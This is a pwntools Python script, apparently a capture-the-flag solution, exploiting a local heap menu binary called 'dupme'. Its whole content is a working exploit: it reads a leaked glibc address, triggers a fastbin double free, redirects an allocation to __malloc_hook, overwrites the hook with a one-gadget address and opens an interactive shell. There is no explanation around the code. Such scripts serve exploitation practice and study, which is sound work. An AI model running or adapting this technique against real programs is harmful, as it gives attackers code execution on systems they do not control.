# coding: utf-8
# %load script.py
from pwn import *

p=1
    
def main():
    global p
    p = process(['./ld.so.2', './dupme'], env={'LD_PRELOAD':'./libc.so.6'})
    p.recvuntil("glibc leak: ")
    leak = int(p.recvuntil("\n"),16)
    print(p.recvuntil("Exit\n"))
    print(leak,hex(leak))
    #print(p.recv())
    malloc("0","104","what")
    malloc("1","104","wwat")
    free("0")
    free("1")
    free("0")
    elf = ELF("./libc.so.6")
    elf.address = leak - elf.sym.printf
    print(elf.address)
    chunk = malloc("0","104",p64(elf.sym.__malloc_hook - 35))
    malloc("1","104","hi")
    malloc("2","104","hi")
    malloc("3","104",b"a"*(19+16)+p64(0xe27a1+elf.address))
    p.interactive()
    p.close()
    
def free(index):
    global p
    p.sendlineafter("> ","2")
    p.sendlineafter("which index?\n> ",index)
    
def edit(index,data):
    global p
    p.sendlineafter("> ","3")
    p.sendlineafter("which index?\n> ",index)
    p.sendlineafter("New contents?\n> ",data)
   
def view(index):
    global p
    p.sendlineafter("> ","4")
    p.sendlineafter("which index?\n> ",index)
    p.recv()
    
def malloc(index,size,data):
    global p
    p.sendlineafter("> ","1")
    p.sendlineafter("which index?\n> ",index)
    p.sendlineafter("how big?\n> ",size)
    p.sendlineafter("first payload?\n> ",data)
    
main()
